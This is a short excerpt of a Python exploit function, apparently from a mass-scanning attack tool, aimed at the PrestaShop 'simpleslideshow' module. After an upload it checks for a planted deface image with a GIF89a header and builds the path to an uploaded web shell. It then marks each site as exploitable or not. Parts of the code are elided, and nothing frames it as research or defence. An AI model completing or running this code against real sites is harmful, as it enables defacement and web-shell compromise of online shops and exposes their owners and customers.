...
def Exploit(site):
    try:
        ...
        if 'success' in GoT.content:
            IndexPath = '/modules/simpleslideshow/slides/' + Jce_Deface_image.split('/')[1]
            ...
            if 'GIF89a' in CheckIndex.content:
                ...
                ShellPath = '/modules/simpleslideshow/slides/' + ShellPresta.split('/')[1]
                ...
                return printModule.returnYes(site, 'N/A', 'simpleslideshow Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'simpleslideshow Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'simpleslideshow Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'simpleslideshow Module', 'Prestashop')
